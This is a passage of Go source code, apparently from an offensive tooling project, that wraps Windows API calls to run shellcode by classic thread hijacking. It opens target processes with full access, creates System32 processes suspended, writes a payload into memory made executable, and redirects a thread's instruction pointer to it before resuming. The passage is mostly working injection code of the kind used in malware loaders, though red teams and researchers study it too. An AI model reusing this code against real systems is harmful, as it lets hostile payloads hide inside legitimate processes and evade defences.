	systemProcInfo := (*SYSTEM_PROCESS_INFORMATION)(unsafe.Pointer(&buffer[0]))
	for {
		if systemProcInfo.ImageName.Length > 0 {
			name := syscall.UTF16ToString((*[4096]uint16)(unsafe.Pointer(systemProcInfo.ImageName.Buffer))[:systemProcInfo.ImageName.Length/2])
			if strings.EqualFold(name, procName) {
				pid := DWORD(systemProcInfo.UniqueProcessId)
				// fmt.Printf("Found process %s with PID %d\n", name, pid)
				hProcess, err := OpenProcess(PROCESS_ALL_ACCESS, false, pid)
				if err != nil {
					return 0, 0, fmt.Errorf("OpenProcess failed: %v", err)
				}
				return pid, hProcess, nil
			}
		}

		if systemProcInfo.NextEntryOffset == 0 {
			break
		}

		// Move to the next entry
		addr := uintptr(unsafe.Pointer(systemProcInfo)) + uintptr(systemProcInfo.NextEntryOffset)
		systemProcInfo = (*SYSTEM_PROCESS_INFORMATION)(unsafe.Pointer(addr))
	}

	return 0, 0, fmt.Errorf("Process not found")
}

func RunViaClassicThreadHijacking(hThread HANDLE, pPayload []byte) error {
	// Allocate memory in the target process
	sPayloadSize := SIZE_T(len(pPayload))
	pAddress, err := VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if err != nil {
		return fmt.Errorf("VirtualAlloc failed: %v", err)
	}
	// defer VirtualFree(pAddress, sPayloadSize, MEM_RELEASE)

	// Write the payload to the target process
	Memcpy(unsafe.Pointer(pAddress), unsafe.Pointer(&pPayload[0]), sPayloadSize)

	// Change the protection of the memory
	var oldProtect DWORD
	err = VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &oldProtect)
	if err != nil {
		return fmt.Errorf("VirtualProtect failed: %v", err)
	}

	// Getting the original thread context
	threadContext := &CONTEXT{
		ContextFlags: CONTEXT_CONTROL,
	}
	// Debugf("Empty threadContext: %+v\n", threadContext)
	err = GetThreadContext(hThread, threadContext)
	if err != nil {
		return fmt.Errorf("GetThreadContext failed: %v", err)
	}
	// Debugf("Return threadContext: %+v\n", threadContext)
	Debugf("Original RIP: 0x%X\n", threadContext.Rip)

	// Updating the next instruction pointer to be equal to the payload's address
	threadContext.Rip = uint64(pAddress)

	Debugf("New RIP: 0x%X\n", threadContext.Rip)

	// Updating the new thread context
	err = SetThreadContext(hThread, threadContext)
	if err != nil {
		return fmt.Errorf("SetThreadContext failed: %v", err)
	}

	return nil
}

/*
DWORD ResumeThread(

	[in] HANDLE hThread

);
*/
func ResumeThread(hThread HANDLE) error {
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	resumeThread := kernel32.MustFindProc("ResumeThread")
	result, _, ntStatus := resumeThread.Call(uintptr(hThread))
	err := NTStatusToError(NTSTATUS(ntStatus.(syscall.Errno)))
	if err != nil {
		return err
	}
	if result == 0 {
		return errors.New("resumeThread had zero result")
	}
	return nil
}

/*
BOOL GetThreadContext(

	[in]      HANDLE    hThread,
	[in, out] LPCONTEXT lpContext

);
*/
func GetThreadContext(hThread HANDLE, lpContext *CONTEXT) error {
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	getThreadContext := kernel32.MustFindProc("GetThreadContext")
	result, _, ntStatus := getThreadContext.Call(uintptr(hThread), uintptr(unsafe.Pointer(lpContext)))
	err := NTStatusToError(NTSTATUS(ntStatus.(syscall.Errno)))
	if err != nil {
		return errors.New("GetThreadContext failed: " + err.Error())
	}
	if result == 0 {
		// Debugf("GetThreadContext failed: %v\n", ntStatus)
		return errors.New("getThreadContext had zero result: " + ntStatus.Error())
	}
	return nil
}

/*
BOOL SetThreadContext(

	[in] HANDLE        hThread,
	[in] const CONTEXT *lpContext

);
*/
func SetThreadContext(hThread HANDLE, lpContext *CONTEXT) error {
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	setThreadContext := kernel32.MustFindProc("SetThreadContext")
	result, _, ntStatus := setThreadContext.Call(uintptr(hThread), uintptr(unsafe.Pointer(lpContext)))
	err := NTStatusToError(NTSTATUS(ntStatus.(syscall.Errno)))
	if err != nil {
		return errors.New("SetThreadContext failed: " + err.Error())
	}
	if result == 0 {
		return errors.New("setThreadContext had zero result")
	}
	return nil
}

/*
	typedef struct _CONTEXT {
	  DWORD64 P1Home;
	  DWORD64 P2Home;
	  DWORD64 P3Home;
	  DWORD64 P4Home;
	  DWORD64 P5Home;
	  DWORD64 P6Home;
	  DWORD   ContextFlags;
	  DWORD   MxCsr;
	  WORD    SegCs;
	  WORD    SegDs;
	  WORD    SegEs;
	  WORD    SegFs;
	  WORD    SegGs;
	  WORD    SegSs;
	  DWORD   EFlags;
	  DWORD64 Dr0;
	  DWORD64 Dr1;
	  DWORD64 Dr2;
	  DWORD64 Dr3;
	  DWORD64 Dr6;
	  DWORD64 Dr7;
	  DWORD64 Rax;
	  DWORD64 Rcx;
	  DWORD64 Rdx;
	  DWORD64 Rbx;
	  DWORD64 Rsp;
	  DWORD64 Rbp;
	  DWORD64 Rsi;
	  DWORD64 Rdi;
	  DWORD64 R8;
	  DWORD64 R9;
	  DWORD64 R10;
	  DWORD64 R11;
	  DWORD64 R12;
	  DWORD64 R13;
	  DWORD64 R14;
	  DWORD64 R15;
	  DWORD64 Rip;
	  union {
	    XMM_SAVE_AREA32 FltSave;
	    NEON128         Q[16];
	    ULONGLONG       D[32];
	    struct {
	      M128A Header[2];
	      M128A Legacy[8];
	      M128A Xmm0;
	      M128A Xmm1;
	      M128A Xmm2;
	      M128A Xmm3;
	      M128A Xmm4;
	      M128A Xmm5;
	      M128A Xmm6;
	      M128A Xmm7;
	      M128A Xmm8;
	      M128A Xmm9;
	      M128A Xmm10;
	      M128A Xmm11;
	      M128A Xmm12;
	      M128A Xmm13;
	      M128A Xmm14;
	      M128A Xmm15;
	    } DUMMYSTRUCTNAME;
	    DWORD           S[32];
	  } DUMMYUNIONNAME;
	  M128A   VectorRegister[26];
	  DWORD64 VectorControl;
	  DWORD64 DebugControl;
	  DWORD64 LastBranchToRip;
	  DWORD64 LastBranchFromRip;
	  DWORD64 LastExceptionToRip;
	  DWORD64 LastExceptionFromRip;
	} CONTEXT, *PCONTEXT;
*/
type CONTEXT struct {
	P1Home               uint64
	P2Home               uint64
	P3Home               uint64
	P4Home               uint64
	P5Home               uint64
	P6Home               uint64
	ContextFlags         uint32
	MxCsr                uint32
	SegCs                uint16
	SegDs                uint16
	SegEs                uint16
	SegFs                uint16
	SegGs                uint16
	SegSs                uint16
	EFlags               uint32
	Dr0                  uint64
	Dr1                  uint64
	Dr2                  uint64
	Dr3                  uint64
	Dr6                  uint64
	Dr7                  uint64
	Rax                  uint64
	Rcx                  uint64
	Rdx                  uint64
	Rbx                  uint64
	Rsp                  uint64
	Rbp                  uint64
	Rsi                  uint64
	Rdi                  uint64
	R8                   uint64
	R9                   uint64
	R10                  uint64
	R11                  uint64
	R12                  uint64
	R13                  uint64
	R14                  uint64
	R15                  uint64
	Rip                  uint64
	FltSave              [512]byte // Covers the largest union member (XMM_SAVE_AREA32)
	VectorRegister       [26][16]byte
	VectorControl        uint64
	DebugControl         uint64
	LastBranchToRip      uint64
	LastBranchFromRip    uint64
	LastExceptionToRip   uint64
	LastExceptionFromRip uint64
}

/*
#define CONTEXT_i386    0x00010000L    // this assumes that i386 and
#define CONTEXT_i486    0x00010000L    // i486 have identical context records

#define CONTEXT_CONTROL         (CONTEXT_i386 | 0x00000001L) // SS:SP, CS:IP, FLAGS, BP
#define CONTEXT_INTEGER         (CONTEXT_i386 | 0x00000002L) // AX, BX, CX, DX, SI, DI
#define CONTEXT_SEGMENTS        (CONTEXT_i386 | 0x00000004L) // DS, ES, FS, GS
#define CONTEXT_FLOATING_POINT  (CONTEXT_i386 | 0x00000008L) // 387 state
#define CONTEXT_DEBUG_REGISTERS (CONTEXT_i386 | 0x00000010L) // DB 0-3,6,7
#define CONTEXT_EXTENDED_REGISTERS  (CONTEXT_i386 | 0x00000020L) // cpu specific extensions

	#define CONTEXT_FULL (CONTEXT_CONTROL | CONTEXT_INTEGER |\
	                      CONTEXT_SEGMENTS)

	#define CONTEXT_ALL             (CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS | \
	                                 CONTEXT_FLOATING_POINT | CONTEXT_DEBUG_REGISTERS | \
	                                 CONTEXT_EXTENDED_REGISTERS)

#define CONTEXT_XSTATE          (CONTEXT_i386 | 0x00000040L)

#define CONTEXT_EXCEPTION_ACTIVE    0x08000000L
#define CONTEXT_SERVICE_ACTIVE      0x10000000L
#define CONTEXT_EXCEPTION_REQUEST   0x40000000L
#define CONTEXT_EXCEPTION_REPORTING 0x80000000L
*/
const (
	CONTEXT_i386                = 0x00010000
	CONTEXT_i486                = 0x00010000
	CONTEXT_CONTROL             = CONTEXT_i386 | 0x00000001
	CONTEXT_INTEGER             = CONTEXT_i386 | 0x00000002
	CONTEXT_SEGMENTS            = CONTEXT_i386 | 0x00000004
	CONTEXT_FLOATING_POINT      = CONTEXT_i386 | 0x00000008
	CONTEXT_DEBUG_REGISTERS     = CONTEXT_i386 | 0x00000010
	CONTEXT_EXTENDED_REGISTERS  = CONTEXT_i386 | 0x00000020
	CONTEXT_FULL                = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS
	CONTEXT_ALL                 = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS | CONTEXT_FLOATING_POINT | CONTEXT_DEBUG_REGISTERS | CONTEXT_EXTENDED_REGISTERS
	CONTEXT_XSTATE              = CONTEXT_i386 | 0x00000040
	CONTEXT_EXCEPTION_ACTIVE    = 0x08000000
	CONTEXT_SERVICE_ACTIVE      = 0x10000000
	CONTEXT_EXCEPTION_REQUEST   = 0x40000000
	CONTEXT_EXCEPTION_REPORTING = 0x80000000
)

/*
BOOL CreateProcessA(

	[in, optional]      LPCSTR                lpApplicationName,
	[in, out, optional] LPSTR                 lpCommandLine,
	[in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
	[in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
	[in]                BOOL                  bInheritHandles,
	[in]                DWORD                 dwCreationFlags,
	[in, optional]      LPVOID                lpEnvironment,
	[in, optional]      LPCSTR                lpCurrentDirectory,
	[in]                LPSTARTUPINFOA        lpStartupInfo,
	[out]               LPPROCESS_INFORMATION lpProcessInformation

);
*/
func CreateProcessA(lpApplicationName string, lpCommandLine string, lpProcessAttributes *SECURITY_ATTRIBUTES, lpThreadAttributes *SECURITY_ATTRIBUTES, bInheritHandles bool, dwCreationFlags DWORD, lpEnvironment *LPVOID, lpCurrentDirectory string, lpStartupInfo *STARTUPINFO, lpProcessInformation *PROCESS_INFORMATION) error {
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	createProcessA := kernel32.MustFindProc("CreateProcessA")
	var err error
	lpstr, err := syscall.BytePtrFromString(lpCommandLine)
	if err != nil {
		return err
	}
	// TODO: Update this to use all parameters
	_, _, ntStatus := createProcessA.Call(NULL,
		uintptr(unsafe.Pointer(lpstr)),
		NULL,
		NULL,
		boolToUintptr(bInheritHandles),
		uintptr(dwCreationFlags),
		NULL,
		NULL,
		uintptr(unsafe.Pointer(lpStartupInfo)),
		uintptr(unsafe.Pointer(lpProcessInformation)),
	)
	// fmt.Printf("ntStatus: %#+v\n", ntStatus)
	if ntStatus != nil {
		if errno, ok := ntStatus.(syscall.Errno); ok && errno != 0 {
			return errors.New("CreateProcessA failed: " + ntStatus.Error())
		}
	}
	return nil
}

/*
	typedef struct _SECURITY_ATTRIBUTES {
	  DWORD  nLength;
	  LPVOID lpSecurityDescriptor;
	  BOOL   bInheritHandle;
	} SECURITY_ATTRIBUTES, *PSECURITY_ATTRIBUTES, *LPSECURITY_ATTRIBUTES;
*/
type SECURITY_ATTRIBUTES struct {
	NLength              DWORD
	LpSecurityDescriptor LPVOID
	BInheritHandle       bool
}

/*
	typedef struct _STARTUPINFOA {
  DWORD  cb;
  LPSTR  lpReserved;
  LPSTR  lpDesktop;
  LPSTR  lpTitle;
  DWORD  dwX;
  DWORD  dwY;
  DWORD  dwXSize;
  DWORD  dwYSize;
  DWORD  dwXCountChars;
  DWORD  dwYCountChars;
  DWORD  dwFillAttribute;
  DWORD  dwFlags;
  WORD   wShowWindow;
  WORD   cbReserved2;
  LPBYTE lpReserved2;
  HANDLE hStdInput;
  HANDLE hStdOutput;
  HANDLE hStdError;
} STARTUPINFOA, *LPSTARTUPINFOA;
*/

type STARTUPINFO struct {
	Cb              DWORD
	LpReserved      *LPSTR
	LpDesktop       *LPSTR
	LpTitle         *LPSTR
	DwX             DWORD
	DwY             DWORD
	DwXSize         DWORD
	DwYSize         DWORD
	DwXCountChars   DWORD
	DwYCountChars   DWORD
	DwFillAttribute DWORD
	DwFlags         DWORD
	WShowWindow     WORD
	CbReserved2     WORD
	LpReserved2     *LPBYTE
	HStdInput       HANDLE
	HStdOutput      HANDLE
	HStdError       HANDLE
}

type WORD uint16
type LPBYTE uintptr

/*
	typedef struct _PROCESS_INFORMATION {
	  HANDLE hProcess;        // A handle to the newly created process.
	  HANDLE hThread;         // A handle to the main thread of the newly created process.
	  DWORD  dwProcessId;     // Process ID
	  DWORD  dwThreadId;      // Main Thread's ID
	} PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION;
*/
type PROCESS_INFORMATION struct {
	HProcess    HANDLE
	HThread     HANDLE
	DwProcessId DWORD
	DwThreadId  DWORD
}

/*
DWORD GetEnvironmentVariableA(

	[in, optional]  LPCSTR lpName,
	[out, optional] LPSTR  lpBuffer,
	[in]            DWORD  nSize

);
*/
func GetEnvironmentVariableA(lpName string, lpBuffer *LPSTR, nSize DWORD) (DWORD, error) {
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	getEnvironmentVariableA := kernel32.MustFindProc("GetEnvironmentVariableA")
	result, _, ntStatus := getEnvironmentVariableA.Call(
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(lpName))),
		uintptr(unsafe.Pointer(lpBuffer)),
		uintptr(nSize),
	)
	err := NTStatusToError(NTSTATUS(ntStatus.(syscall.Errno)))
	if err != nil {
		return 0, errors.New("GetEnvironmentVariableA failed: " + err.Error())
	}
	return DWORD(result), nil
}

type LPSTR uintptr

func GetEnvironmentalVariable(key string) string {
	return os.Getenv(key) // Builtin Go Functionality (Need to check if this calls any DLL's)
}

func CreateSuspendedProcess(processName string) (dwProcessId *DWORD, hProcess, hThread *HANDLE, err error) {
	WnDr := GetEnvironmentalVariable("WINDIR")
	lpPath := WnDr + "\\System32\\" + processName
	Si := STARTUPINFO{}
	Pi := PROCESS_INFORMATION{}
	Debugf("Running %s\n", lpPath)
	// TEST
	// lpPath = "\"C:\\WINDOWS\\System32\\notepad.exe\""
	err = CreateProcessA("", lpPath, nil, nil, false, CREATE_SUSPENDED, nil, "", &Si, &Pi)
	if err != nil {
		return nil, nil, nil, fmt.Errorf("failed to create process: %v", err)
	}
	Debugf("Created process %s\n", processName)
	dwProcessId = &Pi.DwProcessId
	hProcess = &Pi.HProcess
	hThread = &Pi.HThread
	// Ensure we have dwProcessId , hProcess , and hThread
	if *dwProcessId == 0 || *hProcess == NULL || *hThread == NULL {
		return nil, nil, nil, errors.New("failed to create process")
	}
	// return dwProcessId, hProcess, hThread
	return dwProcessId, hProcess, hThread, nil
}

func HijackThread(hThread HANDLE, pAddress uintptr) error {
	// Getting the original thread context
	threadContext := &CONTEXT{
		ContextFlags: CONTEXT_CONTROL,
	}
	// Debugf("Empty threadContext: %+v\n", threadContext)
	Debugf("hThread %d\npAddress: %X\n", hThread, pAddress)
	err := GetThreadContext(hThread, threadContext)
	if err != nil {
		return fmt.Errorf("GetThreadContext failed: %v", err)
	}
	// Debugf("Return threadContext: %+v\n", threadContext)
	Debugf("Original RIP: 0x%X\n", threadContext.Rip)

	// Updating the next instruction pointer to be equal to the payload's address
	threadContext.Rip = uint64(pAddress)

	Debugf("New RIP: 0x%X\n", threadContext.Rip)

	// Updating the new thread context
	err = SetThreadContext(hThread, threadContext)
	if err != nil {
		return fmt.Errorf("SetThreadContext failed: %v", err)
	}
	Debugf("SetThreadContext succeeded\n")
	DebugWait("RESUME THREAD")
	ResumeThread(hThread)
	DebugWait("RESUME THREAD DONE")
	WaitForSingleObject(hThread, INFINITE)
	return nil
}

/*
DWORD WaitForSingleObject(

	[in] HANDLE hHandle,
	[in] DWORD  dwMilliseconds

);
*/
func WaitForSingleObject(hHandle HANDLE, dwMilliseconds DWORD) error {
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	waitForSingleObject := kernel32.MustFindProc("WaitForSingleObject")
	result, _, ntStatus := waitForSingleObject.Call(uintptr(hHandle), uintptr(dwMilliseconds))
	err := NTStatusToError(NTSTATUS(ntStatus.(syscall.Errno)))
	if err != nil {
		return errors.New("WaitForSingleObject failed: " + err.Error())
	}
	if result == WAIT_FAILED {
		return errors.New("waitForSingleObject had WAIT_FAILED")
	}
	return nil
}

const (
	WAIT_FAILED = 0xFFFFFFFF
	INFINITE    = 0xFFFFFFFF
)
